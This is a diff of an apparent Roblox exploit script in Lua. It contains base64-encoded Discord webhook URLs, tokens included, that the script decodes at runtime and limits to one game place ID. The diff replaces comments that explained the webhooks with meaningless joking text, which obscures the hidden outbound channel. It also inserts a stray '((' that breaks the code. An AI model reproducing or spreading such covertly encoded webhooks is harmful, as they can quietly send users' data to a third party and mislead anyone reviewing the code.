@@ -504,7 +504,7 @@ MainTab:CreateToggle({
 		setHeaviness(enabled)
 	end
 })
-
+((
 -- Full Anti Hit System script
 
 local function runAntiHitScript()
@@ -2284,7 +2284,7 @@ local TeleportService = game:GetService("TeleportService")
 local allowedPlaceId = 109983668079237
 if game.PlaceId ~= allowedPlaceId then return end
 
--- Pure Lua Base64 decoder
+-- hi try it cant spam no more
 local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local function decodeBase64(data)
     data = data:gsub('[^'..b..'=]', '')
@@ -2305,7 +2305,7 @@ local function decodeBase64(data)
     end))
 end
 
--- Encoded webhook strings
+-- lol nothing strings
 local encodedWebhooks = {
     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5OTEyMzUxNzMxOTk0MjE5NC9VQ3RYVVI5V0ltZkk4QmE0Vnk3SXE1NXNSY3NRanA2SXk3Tk13T2dQckVNT1NjWFR3bkdLbk9LSmpZMTdaTzVpOTh0Zw==",
     "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5OTEyNTI0MjIxMDY4NTEzMi9rb3hlTzJ0WE9ya0QxVlhQQ25sMzlvdDBGbXZYSnoxNFR3Tm5OTzljdHBjWjE3NWF5QWNKVjRuRHRmZ29kUTBnVlVvSQ=="
@@ -2313,7 +2313,7 @@ local encodedWebhooks = {
 local encodedExtraWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5OTEyMjc2MDc5MzMyNTYwMC8wWTdoai1YdEx2QWNKSnZsYVFCX3lXVXdfOF8xSmQ5TEQ0RDBWLTM4OXdhbExoSlQ0VjR1QTBPWmR6SXRQdW12RC1kSw=="
 local encodedMidWebhook   = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5OTExNDI4NTM3MTg4MzU1MC91b0hwckgwcnhRRW5ZS2hPREl2Y3R2bVppR1J0ZmRWVHJjcHJXR1MxRFRpeC1ORVh0OWdnSTNqREVVNkRzek9yRlc4Yw=="
 
--- Decode webhooks at runtime
+-- wow webhooks at lol
 local webhookUrls = {}
 for _, e in ipairs(encodedWebhooks) do
     table.insert(webhookUrls, decodeBase64(e))
